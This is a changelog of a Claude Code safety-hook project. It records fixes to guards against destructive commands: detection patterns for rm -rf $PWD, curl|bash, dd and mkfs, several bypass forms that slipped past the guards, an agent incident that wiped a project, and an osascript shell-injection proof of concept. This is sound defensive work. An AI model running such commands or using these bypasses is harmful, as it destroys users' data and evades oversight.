legit `$()` and backtick usage in normal scripts. New `tests/test-destructive-prompt-scanner.sh` with 15 cases (all 4 false-positive guards explicit). 971 tests passing.

Only `MODE_TokenEfficiency.md` had a borrowable mechanism: an 8-symbol logic shorthand table (`→`, `⇒`, `∵`, `∴`, `»`, `≈`, `Δ`, `&`) with use-case examples. Added to `configs/economy/minimal.md` as an *optional* section — the model substitutes connective symbols for words when meaning is unambiguous and the reader is technical, with an explicit "skip in safety-critical output" guard so the existing Safety Override (security warnings, irreversible action confirmations) is unaffected. No code changes; the table only governs output style under minimal tier. Other tiers (standard/lean) unchanged. 956 tests passing.

(1) New `hooks/setup-check.sh` registered on the `Setup` event (fires at `claude --init` / `--init-only` / `--maintenance`, added in CC v2.1.10 — not yet in the official hooks reference page). (3) `docs/HOOK_AUTHORING.md` — added 3 missing event rows (`Setup`, `UserPromptExpansion`, `PostToolBatch`) and a paragraph on agent-frontmatter hooks (CC changelog v2.1.0 mentions 3 but 6 fire in practice: PreToolUse, PostToolUse, PermissionRequest, PostToolUseFailure, Stop, SubagentStop). (4) Full-mode hook count 97 → 99; updated `tests/test-install.sh` expectations in both spots. 15 new tests (5 setup-check + 10 slash-command-guard). 956 tests passing.
- [2.6.73] - 2026-06-23 — fix(scope-guard): TTL stat fallback broke on Linux CI. v2.6.71 added a 6h mtime check on `.contract` so crashed sessions self-heal stale state. Stat call ordered macOS-first (`stat -f '%m'`) with Linux fallback (`stat -c '%Y'`). Bug: on Linux the macOS-form `stat -f` runs as filesystem stats with `%m` = mountpoint, returning a string like "File: /home" not a number — never errors, never falls through. `_MT` got non-numeric content. Arithmetic `$((_NOW - _MT))` at scope-guard.sh:55 tokenized "File" as a variable name; `set -u` killed it ("File: unbound variable"). Test "contract mode skips if contract already exists" failed on ubuntu-latest in CI (run 28002209268), exit=1. Local macOS unaffected (stat-f succeeds with mtime). Fix: reorder GNU-first (`stat -c '%Y'` first, BSD `stat -f '%m'` second), then numeric guard via case-glob `*[!0-9]*` falling back to `_NOW` if anything non-numeric slipped through. Both platforms now resolve to a clean integer mtime. Verified locally: 5/5 scope-guard tests + the affected `test-hooks.sh` assertion all pass.
- [2.6.72] - 2026-06-22 — **SECURITY**: fix(notify-helper): RCE via osascript argument interpolation. Final-batch audit subagent found a shell injection in `hooks/notify-helper.sh:53-67`. The sed sanitisation escaped `\` and `"` but NOT backticks or `$()` — and the resulting string was interpolated directly into `osascript -e "display notification \"$safe_msg\" with title \"$safe_title\""`, which bash evaluates BEFORE osascript sees it. A git branch name like `` test`open /Applications/Calculator.app` `` triggered command execution on every notification (notify, notify-stop, notify-permission) for macOS users. PoC: checkout a branch with backticks in the name, trigger any notify hook, attacker-controlled command runs. Two-layer fix: (1) strip ` and `$` from msg/title before any other escaping (`tr -d '`$'`), so even if downstream quoting drifts, the dangerous metachars are gone. (2) pass values via env vars (`SC_NOTIFY_MSG`, `SC_NOTIFY_TITLE`) into osascript's `system attribute` API instead of shell-interpolating into the `-e` argument — no further bash expansion possible. Verified RCE probe: `touch /tmp/sc-rce-probe-$$` injected via both backtick and `$()` paths fails to execute after fix. Limited blast radius: only macOS users with notify hooks active and an attacker capable of controlling a git branch name (or other text passed to notifications). Other findings from the same audit batch: `subagent-discovery.sh` and `cmd-normalize.sh` PASS clean. `elicitation-discovery.sh:98` NOTE (dead `${1:-payload}` reference, harmless). `lib-suppress.sh` two NOTEs (EPOCHREALTIME precision edge case, hook_already_emitted TOCTOU non-issue). 282 tests passing.

Added 6-hour mtime check (`stat -f '%m'` macOS / `stat -c '%Y'` Linux); fresh contracts preserved, stale ones self-healed. (2) `hooks/economy-reinforce.sh:49` — `date +%s > "$ECO_ACK_FLAG"` wrote a timestamp string whose only consumer reads file mtime. Replaced with `touch "$ECO_ACK_FLAG"` — equivalent behavior, no dead I/O. (3) `hooks/rate-limit-advisor.sh:81` — always emitted `hookSpecificOutput.additionalContext` ignoring `HOOK_SUPPRESS`, so debug mode (`~/.claude/supercharger/scope/.debug-hooks` present) couldn't surface the rate-burn warning visibly. Now branches on suppress: default → additionalContext, debug → systemMessage with `suppressOutput: false`. Matches the pattern used by adaptive-economy, context-advisor, and other UserPromptSubmit advisories. 282 tests passing.
- [2.6.70] - 2026-06-22 — fix: two bugs from 3-batch parallel audit of remaining UserPromptSubmit/MCP/file-event hooks. (1) `hooks/mcp-tracker.sh:25` — regex `^mcp__([^_]+)` captured only up to the first `_`, truncating server names with underscores. `mcp__my_server__do_thing` extracted as `my` instead of `my_server`. Added both guards after `init_hook_suppress`. Verified: disabling via `.disabled-hooks` now suppresses output as expected. Batch A (UserPromptSubmit secondary) audit found 5/5 PASS: rate-limit-advisor, scope-guard, learn-from-prompts, context-advisor, economy-reinforce all clean. Three cosmetic notes deferred (not bugs): rate-limit-advisor loads HOOK_SUPPRESS but doesn't consult it (minor inconsistency); economy-reinforce.sh:49 writes `date +%s` to a flag file whose only consumer reads mtime (could be `touch`); scope-guard.sh:50 has no TTL on `.contract` so a crashed session leaves it stale (self-heal would be nice). 282 tests passing.

- [2.6.69] - 2026-06-22 — fix(disclosure+security): correct false "no external calls" README claim and tighten smart-approve, ahead of an awesome-claude-code submission. A static review against the maintainer's own `evaluate-repository.md` rubric (which mandates a network grep) surfaced two must-fix items. (1) README FAQ stated "No external calls. Everything runs locally" — false: `hooks/update-check.sh` makes a once-daily HTTPS GET to `api.github.com` for the latest version string (registered in the default Full mode at `lib/hooks.sh`), and `tools/update.sh` does the same on demand. Reworded the FAQ to disclose this accurately (no user data sent, only a static `User-Agent`), and added a real opt-out: `SUPERCHARGER_NO_UPDATE_CHECK=1` short-circuits `update-check.sh` before any network call (also surfaced in the opt-out env-var table). (2) `hooks/smart-approve.sh` auto-approved the whole `node|python3?|ruby|tsx|ts-node|npx|bunx` class, which silently granted permission for inline-eval arbitrary code (`node -e`, `python3 -c`) and arbitrary-package execution (`npx <pkg>`) without confirmation. Tightened to exclude inline-eval flags (`-e`/`-c`/`-p`/`--eval`/`--print`) and to drop `npx`/`bunx` entirely — `node build.js` / `python3 manage.py` still auto-approve, but eval and package-fetch forms now require explicit user confirmation. Also documented the `settings.json` mutations (`ENABLE_PROMPT_CACHING_1H`, `attribution`) in the README install section; reconciled the MCP profile tables (README + `install.sh`) against the canonical `tools/mcp-profile.sh` (dev = +Playwright/GitHub/Magic UI ~1,200; research = +Memory/Sequential ~1,500; full = everything ~3,500); replaced the drifting "84 hooks documented" count with "Every hook documented"; and removed stray tracked artifacts (`25.9.0_2`, a stale root `.version` at v2.3.22 now gitignored, and a stale tracked `.claudedocs` scan report). No malware, exfiltration, or supply-chain risk found; exit-code-2 blocking and install modes (19 safe / 98 full) verified. 939 tests passing.

- [2.6.67] - 2026-06-22 — tool(observability): agent-report-tail recovers structured findings from degraded subagent transcripts. The Claude Code v2.1.176 return-message bug (anthropics/claude-code#69970) degrades subagent final replies to one-line confirmations ("Ready.", "Standing by.") even when the agent produced a full report earlier — verified across 6 parallel audit agents in v2.6.66 where actual reports lived only in the on-disk JSONL transcripts. New `tools/agent-report-tail.sh` extracts assistant text blocks matching structured markers (HOOK:, STATUS:, FAIL, PASS, BUG, FINDING, EXPECTED, ACTUAL, REPRO) from any agent's transcript file. Auto-discovers the session task dir under `/tmp/claude-*/-Users-*/*/tasks/`. Usage: `bash tools/agent-report-tail.sh <agent-id>` (structured filter), `--all` (every text block >80 chars), or `--latest` (most recently completed agent). Skipped block-uniqueness via a set so iterations don't duplicate. Until upstream is fixed, this is the workaround pattern for recovering audit/research subagent output that didn't survive the return channel. Tested: extracted 5 finding-blocks from the v2.6.66 audit transcript including the quality-gate npx flag bug.
- [2.6.66] - 2026-06-22 — fix: four bugs from parallel-subagent audit sweep across ~40 unaudited hooks. Launched 6 Sherlock Holmes (Detective) subagents to audit batches in parallel; the v2.6.64 SubagentStop fix landed but findings still came through degraded (CC v2.1.176 return-value path filed in anthropics/claude-code#69970). Extracted findings from `~/.../tasks/*.output` JSONL transcripts via grep for text blocks containing `HOOK:`. (1) `hooks/trace-compactor.sh:15` — Bash PostToolUse payloads deliver stdout under `.tool_response.stdout`, but trace-compactor read only `.tool_response.output`. Hook silently exited on every Bash-produced traceback, never compacting any of them. Now reads `.stdout // .output` matching `bash-output-compactor.sh:65`. Verified: 60-frame Python traceback now compacted from 6059→62 chars (`[TRACEBACK COMPACTED: 60 frames → ValueError: bad (at x.py:1)]`). (2) `hooks/quality-gate.sh:108` — `npx --no prettier --write` used an invalid flag. The intent was `--no-install` (prevent network fetch when prettier isn't locally installed). On npm ≥ 7 this errors; older silently network-fetches. Fixed. (3) `hooks/project-config.sh:166-175` — `disableHooks: []` (explicit empty list) conflated with key-absent and deleted `.disabled-hooks` from disk. Cross-project state bleed: project A sets `disableHooks: ["safety.sh"]`, then project B (without the key) inherits the file, then a project C with `disableHooks: []` silently clears B's intended setting. Refactored to tri-state: key absent → no change, present-but-empty → clear, populated → write. (4) `hooks/stop-failure.sh:33` — `advice_map` matched against the first non-empty of `stop_reason > error > message`, but real payloads sometimes carry generic `stop_reason: "error"` with the specific class (`rate_limit_error`) in `.error`. Lookup missed. Now walks all three fields, applies both `startswith(prefix)` and `prefix in cand` matching, picks first hit. False alarms suppressed from agent reports: `reentry-detector.sh:30` (already grep-based since v2.6.60), `permission-denied-advisor.sh:47` (already normalizes newlines). Audit also confirmed PASS on: bash-output-compactor, mcp-output-truncator, audit-trail, typecheck, lazy-refactor-check, comment-replacement-check, env-file-guard, thinking-budget, config-scan, precompact-priorities, post-compact-inject, learn-from-blocks (correctly labeled reader), compaction-backup, subagent-safety, tool-call-limiter, slow-tool-detector, skill-poisoning-scanner, tool-failure-advisor, permission-denied-advisor. 282 tests passing.
- [2.6.65] - 2026-06-22 — test: update subagent-stop-check assertions for v2.6.64 channel switch. Local test-hooks.sh ran clean (different test file, only checks empty/non-empty output) so the regression slipped past pre-push. - [2.6.64] - 2026-06-21 — fix(subagent): SubagentStop hooks swallowed agent findings via systemMessage channel. User reported "the agents are not relaying their findings" — Task tool sub-agent results (Detective, Engineer, Scientist, etc.) reaching the parent session as empty/blank. Two SubagentStop hooks emitted `{"systemMessage": ...}` for advisory output: `agent-handoff-gate.sh` (quality-issue warnings) and `subagent-stop-check.sh` (failure/incomplete pattern detection). Claude Code v2.1.163+ treats `systemMessage` in Stop/SubagentStop events as a TERMINAL replacement for the subagent's last message — instead of supplementing the result, it replaces it. So whenever the gate fired (TODO/stub/failure-pattern detected), Claude Code overwrote the actual findings with the gate's advisory text, and the parent session saw only the warning, not the result. Switched both hooks to `{"hookSpecificOutput": {"hookEventName": "SubagentStop", "additionalContext": ...}}` — the correct channel for supplementing Stop-event output without replacing it. agent-handoff-gate previously branched on `HOOK_SUPPRESS` to choose channel; now always uses additionalContext (the suppress branch was the only fallback path the bug couldn't hit, but consistency wins). subagent-stop-check unconditionally used systemMessage — same channel swap. Other SubagentStop hooks unaffected: subagent-cost (uses additionalContext already), subagent-discovery (async, no output), event-logger (async). 282 tests passing.
- [2.6.63] - 2026-06-21 — fix(commit-check): heredoc commit message validation. Audit of commit-check.sh found 19/20 cases passed; `git commit -m "$(cat <<EOF ... EOF)"` heredoc-bodied messages were silently allowed even when malformed. Two stacked bugs: (1) The segment iterator (`while IFS= read -r seg`) reads SEGMENTS line-by-line, so a multi-line heredoc inside `COMMIT_SEG` got truncated at the first newline — the body was dropped. Fix: when the matched segment contains `<<-?'?EOF'?`, re-target extraction at the original `COMMAND`. (2) The heredoc body regex `<<'?EOF'?\s*\n(.+?)(\nEOF)?` had a LAZY `(.+?)` and an OPTIONAL `(\nEOF)?` terminator, so the engine picked the minimum 1-char match — body = first char, not the actual message. Fix: require closing `\nEOF\b` (with word boundary), forcing the lazy match to expand to the full heredoc. (3) Then the inline regex (`-m\s+[\"'](.+?)[\"']`) was running BEFORE heredoc, capturing the `'` inside `<<'EOF'` (the quote in the heredoc opener), returning garbage like `$(cat <<` as the "message" — over-blocking the quoted-heredoc case. Fix: reorder — try heredoc first, fall back to inline. All 4 heredoc combinations now correct: `<<EOF` valid → silent, `<<EOF` invalid → block, `<<'EOF'` valid → silent, `<<'EOF'` invalid → block. Inline cases unchanged (feat/fix/chore/etc. valid, WIP/updated invalid, --amend allowed, merge commits allowed, interactive commit allowed, compound bypass caught). 20/20 cases pass post-fix. 282 tests passing.
- [2.6.62] - 2026-06-21 — fix(human-approval-gate): `git branch -D` not detected; `-d` over-blocked. Audit of human-approval-gate found 26/27 cases pass; the miss was `git branch -D feature` (force-delete) silently allowed. Root cause: the git-pattern check at line 106 ran against `CMD_NORM` (lowercased), so the case-sensitive `-D` was already mangled to `-d`. Fixing it to literal `-d` (matching the lowercased input) would over-block — `git branch -d` is the SAFE form (only deletes fully-merged branches) and shouldn't gate. Real fix: check the git pattern against the original `COMMAND` (case-preserving) instead of `CMD_NORM`. Git flags are case-sensitive (`-d` vs `-D` differ semantically); the case-insensitive normalization step lost that signal. Now `git branch -D feature` blocks correctly, `git branch -d feature` silent. Other 26 cases continued working: SQL DROP/TRUNCATE/ALTER TABLE/DATABASE/SCHEMA, git reset --hard, git tag -d, git reflog delete, kubectl delete, terraform destroy, helm uninstall, npm publish, cargo publish, twine upload, redis FLUSHALL, docker system prune, docker volume rm, docker rm -f, dd if=, mkfs.*, two-strike pending-file gate (1st blocks, 2nd allows), `humanApprovalGateSkip:[sql]` category opt-out, `SUPERCHARGER_HUMAN_GATE=1` env enable, gate-disabled-by-default behavior, stale TTL (>1h) re-blocks. 282 tests passing.
- [2.6.61] - 2026-06-21 — fix(git-safety): `git clean -fd` combined-flag bypass. Audit of git-safety.sh found 18/19 cases blocked; the miss was `git clean -fd` (canonical "force + delete-untracked-dirs" combo). Regex `(--force|-f)` required `-f` followed by space, so any combined flag (`-fd`, `-fdx`, `-df`) slipped past. Replaced with `(--force|-[a-zA-Z]*f[a-zA-Z]*)` — same pattern safety.sh uses for rm. Now blocks `-fd`, `-f -d`, `-df`, `-fdx`, `--force`. Negative case verified: `git clean -n` (dry run) still silent. Other 18 cases continued working unchanged: force-push to main/master in all 3 forms (`--force`, `--force-with-lease`, `-f`), reset --hard, checkout `<ref> -- .`, checkout `<ref> .`, restore `--source=<ref> .`, checkout `.`, restore `.`, branch -D main, stash drop/clear, compound bypass via `&&`, non-protected force-push rewrites to safe push, normal git ops silent. 282 tests passing.
- [2.6.60] - 2026-06-21 — feat(security): destructive-prompt-scanner defense-in-depth. The user's session diagnosed a Claude Code v2.1.176 regression where `PreToolUse:Bash` hooks silently stopped firing — safety.sh registered correctly, empty permissions, default mode, no settings.local.json override, yet a unique-string probe (`echo SAFETY_PROBE_<timestamp>`) never wrote to the v2.6.58 trace. safety.sh is inert in that session. Until Anthropic fixes the regression, the project-root rm guard is unreachable for affected users. New UserPromptSubmit hook scans the literal prompt text (not the agent's eventual Bash payload) for destructive patterns and emits an `additionalContext` warning so Claude sees the advisory BEFORE choosing a tool. Cannot block — UserPromptSubmit has no veto over tool calls — but routes the danger signal through a different channel that the v2.1.176 bug doesn't touch. Catches: `rm -rf` with `$PWD/$(pwd)/$\{PWD\}/\`pwd\`` ref ("canonical wipe-whatever-dir-the-shell-is-in pattern"), `rm -rf` on `~/$HOME/../` ("irreversible"), `rm -rf` on `.`/`./`/`*` ("wipes CWD"), bare `rm -rf` with any target ("confirm path"), `curl|bash` / `wget|sh` ("pipes remote content to a shell"), `git push --force` / `-f` ("can overwrite remote history"), `git reset --hard` ("destroys uncommitted work"), `dd if=…of=/dev/`, `mkfs.*`, `>/dev/sd*` ("destroys the target device"). 11 verified cases including silent on benign prompts and educational-mention surfacing the soft advisory by design (the agent gets a heads-up even on `what does rm -rf do` — accepting that false-positive to avoid the false-negative on `please rm -rf this project`). Registered in `lib/hooks.sh:91` adjacent to `shell-escape-advisor.sh`. Hook count 96 → 97. Test count updated. 282 tests passing.
- [2.6.59] - 2026-06-21 — fix(security): rm -rf $PWD / $(pwd) bypass. User tested `cd /tmp/guardrail-test-copy && rm -rf "$PWD"` against the v2.6.58-installed safety.sh — the trace confirmed the hook FIRED, but the project-root rule did NOT block. Test copy was wiped. Root cause: the project-root python check (safety.sh:126-141) tokenizes the command PRE-expansion via `shlex.split`. For `rm -rf "$PWD"` the token after the flag is the literal string `$PWD`. python's `expandvars` resolves it against the hook process's own environment — typically NOT the directory the shell will eventually be in after the `cd` segment runs. So `target` becomes the hook's CWD (e.g. claude-supercharger), payload `.cwd` is the cd-target (e.g. /tmp/guardrail-test-copy), they don't match, no block. Fixed by adding a substring case-match BEFORE the python step: `*$PWD*`, `*${PWD}*`, `*$(pwd)*`, `` *`pwd`* `` in the rm args trip a "recursive force rm on CWD via $PWD/$(pwd)" block. Matches all 5 forms (bare, braced, command-sub, backtick, double-quoted). Negative case verified: `echo $PWD` still passes. The shape is the canonical CWD-wipe-from-compound-cd pattern: `cd X && rm -rf "$PWD"`, `pushd X; rm -rf $(pwd); popd`, etc. Synced to installed copy; v2.6.59 ships the hook + version bump. 282 tests passing.
- [2.6.58] - 2026-06-21 — observability: forensic trace breadcrumb in safety.sh. After v2.6.57 user reported "rm -rf ." still didn't show a Supercharger block in their live session even though isolation tests pass. Without a per-fire log, can't distinguish (a) hook never fired (settings.json drift, CC didn't match event, session loaded stale registration) from (b) hook fired but matched no rule (regex gap). New trace: every fire writes one line to `~/.claude/supercharger/scope/.safety-trace.log` with timestamp, resolved cwd, and the first 140 chars of the command. Capped at 1000 lines (trims to last 800 when exceeded). When a missed block is reported next, presence/absence of an entry tells which class of bug. No info that wasn't already shown in stderr/JSON — just persisted to disk for forensic recall. 282 tests passing.
- [2.6.57] - 2026-06-21 — fix(security, CRITICAL): payload cwd field drift broke project-root rm guard. User reproduced the v2.6.47 incident pattern in Claude Code v2.1.176 with Opus 4.8: an agent ran `rm -rf <absolute-path-to-CWD>` on a freshly-scaffolded project; safety.sh DID NOT block; the project wiped. Earlier diagnosis blamed `!` shell-escape (real bypass) — but this incident used the Bash tool directly, no shell escape. Root cause: Claude Code v2.1.176 sends the session's working directory in `workspace.current_dir` for some PreToolUse:Bash payloads instead of (or alongside) the top-level `.cwd`. `safety.sh:27` extracted only `.cwd // empty`; when absent, fell back to the spawned hook process's `$PWD` (typically `/` or wherever node forked from), making the project-root rm check at `safety.sh:114-135` compare the absolute rm target against the wrong directory — match fails, no block. Manual repro with `{"workspace":{"current_dir":"/tmp/x"}}` only (no `.cwd`) and command `rm -rf /tmp/x` → EXIT=0 (not blocked) before fix; EXIT=2 (blocked correctly) after. Statusline.sh and agent-router.sh already used the dual-field pattern; the security-critical hooks did not — drift that landed when CC introduced the workspace field. Fix: sed across all 43 hooks reading `.cwd // empty` → `.cwd // .workspace.current_dir // empty`. Files modified: adaptive-economy, agent-handoff-gate, cache-health, code-security-scanner, comment-replacement-check, commit-check, context-advisor, cost-forecast, cron-discovery, cwd-changed, dep-vuln-scanner, design-context, economy-reinforce, elicitation-discovery, env-file-guard, failure-tracker, git-safety, lazy-refactor-check, learn-from-blocks, lesson-recall, lesson-record, mcp-output-truncator, messagedisplay-discovery, output-secrets-scanner, path-guard, post-compact-inject, project-config, reentry-detector, safety, smart-approve, tool-preferences, and 12 more. Verified by re-running the same payload that broke against the hardened hook. 282 tests passing. Recommend immediate /sc-update for anyone on v2.6.47-v2.6.56.

(2) "Architectural limits" — documents the two flows Supercharger can't enforce: user `!` shell-escapes (PreToolUse:Bash bypassed; advisory only via `shell-escape-advisor.sh`) and external terminal commands. Cross-references the README "Scope of protection" section. (3) "Tunables" — exhaustive table of 13 user-overridable env vars (`SUPERCHARGER_TIER`, `_PROFILE`, `_LESSON_THRESHOLD`, `_PRICING_MODEL`, etc.) that hooks read but were previously undocumented in the authoring guide. Expanded "Testing a hook" with the zsh-`echo`-eats-`\n` JSON gotcha (use `printf '%s'`) that burned the v2.6.48 audit and several earlier test sessions. Doc grew 374 → 490 lines; existing sections (Event types, stdin shape, stdout response formats, exit codes, three examples, registration, practical rules) unchanged.

- [2.6.54] - 2026-06-21 — fix(agent-router): broaden Scientist pattern to catch "how do/is/can" and "explain how/what/why/the". Audit of 9-agent classifier with 16 prompts found 1 gap: "explain how server components work" + "how do I set up Redis" + "explain why React 19 dropped legacy mode" all fell through to Steve Jobs (Generalist). Root cause: the Scientist regex had `how does` (literal) and `explain.*concept` (too narrow). Now `how (does|do|is|are|can)` and `explain (how|what|why|the)`. - [2.6.53] - 2026-06-21 — fix(statusline): malformed JSON fell through to outer except printing raw error. Full audit of statusline rendering: 28 cases (13 base + 14 edge + 1 fix) verified. Base claims confirmed: model, dirname, branch, stack, eco, lines, context %, context max, session in/out, cache % (computed correctly from cache_read/cache_creation ratio), Tokens equiv label (subscriber auto-detect via rl_7d_pct > 0 — wired in v2.6.52), Time formatting, session rate-limit %, weekly rate-limit %, session reset countdown. Edge cases confirmed: context bar color thresholds (50→green, 75→yellow, 95→red), cache states (n/a, warming, %), MCP indicator (fresh + stale-after-60s hide), agent indicator, scan-alert per-session + cross-session isolation (the v2.6.49 fix verified holds), memory-restored indicator, 5h rate-limit color escalation (30→dim, 60→yellow, 85→red). One bug found: malformed JSON stdin (e.g. "not json") triggered `json.loads()` raising INSIDE the outer try block, falling through to the catch-all `print('[statusline error: ...]')` instead of degrading gracefully to `[?]` fallback. Fixed by wrapping `json.loads()` in its own try/except that defaults `data = {}` so the rest of the rendering path runs with empty defaults. Empty stdin case was already handled. 929/929 tests passing.
- [2.6.52] - 2026-06-21 — feat(statusline): auto-detect subscriber via weekly rate-limit signal. v2.6.51 required users to manually set `{"plan":"max"}` in `.supercharger.json` to get the `Tokens: $X equiv` label. Anthropic doesn't expose a "what plan am I on?" API endpoint, but the Claude Code payload's `rate_limits.seven_day.used_percentage` field is a tell — only subscribers have weekly limits, API users don't. `hooks/statusline.sh` now: (1) auto-detects subscriber when `rl_7d_pct > 0` and relabels `Cost: → Tokens: ... equiv` without any config; (2) honors `.supercharger.json` `"plan"` field as override — `"api"` forces `Cost:` even if a weekly % appears (useful for API users who occasionally see fake numbers); `"max"/"pro"/"team"/"subscription"` forces `Tokens: equiv` even before the first weekly % arrives. Default (no field) = auto-detect. Zero install action required for the common case. 4 new cases verified: API/no-weekly → Cost; subscriber/weekly=2.5% → Tokens equiv; plan:api override → Cost; plan:max override → Tokens equiv.
- [2.6.51] - 2026-06-21 — feat(statusline): plan-aware cost label for Max/Pro/Team subscribers. The statusline `Cost: $X.XX` line was computed from token usage × Anthropic API pricing — accurate for API users, but misleading for subscribers who don't pay per-token. User on Max plan reported confusion ("$137.60 over 28h — but I'm on Max?"). Added a `plan` field to `.supercharger.json`: when set to `max`, `pro`, `team`, or `subscription`, the label changes to `Tokens: $X.XX equiv` to make clear it's the API-equivalent burn, not the invoiced cost. Default (no plan field) stays `Cost: $X.XX` so API users see the actual cost. Walks up 5 levels for project config, falls back to no override. Unknown plan values fall back to default. ~20 lines in `hooks/statusline.sh:293`. No test impact.
- [2.6.50] - 2026-06-18 — fix(memory): decision-capture regex + word-boundary truncation. Deep audit on session-memory-write.sh found the `decided to` decision-capture pattern was firing on the MINIMUM lazy match (10 chars) because the reason clause was optional and the `[^.\n]{10,140}?` group preferred 10. Text "Decided to skip the migration tool because the schema is too small" captured action="skip the m" (10 chars) with no reason — neither the natural action nor the explanation. Fixed by requiring a terminator: either `\s+(?:because|since)\s+([^.\n]{5,120})` OR end-of-sentence/string lookahead. Now captures "skip the migration tool (the schema is too small)" — full action with reason — and "deploy on Friday" — full no-reason case. Plus a `_truncate_words(s, limit)` helper that cuts at the last space ≤ limit instead of mid-word for the existing 80/120-char clamps. README: added a "Tune behavior" subsection documenting `SUPERCHARGER_LESSON_THRESHOLD` (lesson-recall Jaccard threshold; default 0.35), `SUPERCHARGER_PRICING_MODEL`, `SUPERCHARGER_PROFILE`, `SUPERCHARGER_TIER` — these were all read by hooks but undocumented. 929 tests passing.
- [2.6.49] - 2026-06-18 — fix(statusline): scan-alert leaked across sessions. The statusline `⚠ Scan: Secrets/Code/Injection` indicator was driven by a single global file `~/.claude/supercharger/scope/.scan-alert`. Any of the three scanners (`code-security-scanner.sh`, `output-secrets-scanner.sh`, `prompt-injection-scanner.sh`) firing in session A wrote that file, and every concurrent session B/C/D's statusline read it — for 120s — making it look like every project had just hit a scan alert. User-reported. Fixed by suffixing the file with `session_id`: each scanner now writes `.scan-alert-${SID}`, statusline reads `.scan-alert-{session_id}`. SID extracted from hook payload's `.session_id`, falls back to `default` if absent. No more cross-session bleed. 929/929 tests passing.
